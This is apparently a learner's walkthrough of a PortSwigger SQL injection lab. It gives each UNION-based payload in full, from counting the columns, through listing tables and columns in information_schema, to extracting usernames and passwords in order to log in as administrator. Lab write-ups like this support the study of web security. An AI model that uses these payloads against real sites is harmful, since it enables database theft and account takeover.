https://portswigger.net/web-security/sql-injection/examining-the-database/lab-listing-database-contents-non-oracle

Lab objective: `Log in as the 'administrator' user.`

# Lab: SQL injection attack, listing the database contents on non-Oracle databases

We know that this lab contains a SQL injection vulnerability in the product category filter

After clicking Gifts category we need to find `Tabale name, column number, column name, column type and vulnerable column`

1. We find 2 column and query is`category=Gifts' ORDER BY 2--`
2. We find columns are vulnerable and string type and query is `category=-Gifts' UNION SELECT 'A','B'--`
3. Now we find table name by this query `category=-Gifts' UNION SELECT table_name, NULL FROM information_schema.tables--` table name is `users_slklbo` (Table name is different for every-time).
4. Now we will find column name so the query will `category=-Gifts' UNION SELECT column_name, NULL FROM information_schema.columns WHERE table_name='users_slklbo'--` from this we find 3 columns `username_jspfpm, email, password_epbbcp`
5. Now we will find username and password so the query will `category=-Gifts' UNION SELECT username_jspfpm, password_epbbcp FROM users_slklbo--`

We get the password so we can login now. 

![[Sqli Lab 5.png]]
![[Sqli Lab 5-1.png]]
